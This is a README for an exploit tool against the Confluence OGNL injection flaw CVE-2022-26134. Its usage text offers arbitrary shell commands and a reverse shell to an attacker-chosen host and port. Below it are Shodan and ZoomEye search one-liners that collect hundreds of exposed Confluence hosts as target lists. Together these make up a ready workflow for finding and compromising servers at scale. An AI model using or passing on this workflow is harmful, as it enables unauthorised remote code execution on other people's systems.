# [-] CVE-2022-26134 - Confluence Pre-Auth Remote Code Execution via OGNL Injection

## Usage

```bash

usage: exploit.py [-h] [-f FILE] [-c CMD] [-p LPORT] [-l LHOST] [-u URL] [-o OUTPUT]

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  example.txt
  -c CMD, --cmd CMD     Shell command
  -p LPORT, --lport LPORT
                        Local port for reverse shell
  -l LHOST, --lhost LHOST
                        Local host for reverse shell
  -u URL, --url URL     Base target uri (ex. http://target-uri/)
  -o OUTPUT, --output OUTPUT

```

## Shodan Dorks

```bash

shodan search 'http.favicon.hash:-305179312'  --fields ip_str,port --limit 500 --separator ":" | sed 's/.$//'
shodan search 'http.component:"atlassian confluence"'  --fields ip_str,port --limit 500 --separator ":" | sed 's/.$//'
shodan search 'http.title:"Log In - Confluence" 200'  --fields ip_str,port --limit 500 --separator ":" | sed 's/.$//'
shodan search 'http.component:"atlassian confluence" http.title:"Log In - Confluence" 200'  --fields ip_str,port --limit 500 --separator ":" | sed 's/.$//'
shodan search 'http.component:"atlassian confluence"'  --fields ip_str,port --limit 500 --separator ":" | sed 's/.$//'
shodan search 'http.favicon.hash:-305179312 200'  --fields ip_str,port --limit 500 --separator ":" | sed 's/.$//'

```
   
## Zoomeye Dorks

```bash

zoomeye search 'iconhash:-305179312' -num 800 -filter=ip,port
zoomeye search 'app:"atlassian confluence"' -num 800 -filter=ip,port
zoomeye search 'title:"Log In -Confluence"' -num 800 -filter=ip,port

```
